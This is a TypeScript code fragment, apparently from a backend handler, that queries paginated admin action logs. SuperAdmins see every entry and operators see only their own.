    if (agentData?.roleType === 0) {
      // SuperAdmin sees all logs
      logs = await db.select().from(adminActionLog)
        .orderBy(desc(adminActionLog.createdAt))
        .limit(limit)
        .offset(offset);
    } else {
      // Operators see only their own logs
      logs = await db.select().from(adminActionLog)
        .where(eq(adminActionLog.adminId, payload.agentId))
        .orderBy(desc(adminActionLog.createdAt))
        .limit(limit)
        .offset(offset);
    }

    return {
      type: 'ok',
      data: { list: logs, page, limit }
    };
  });
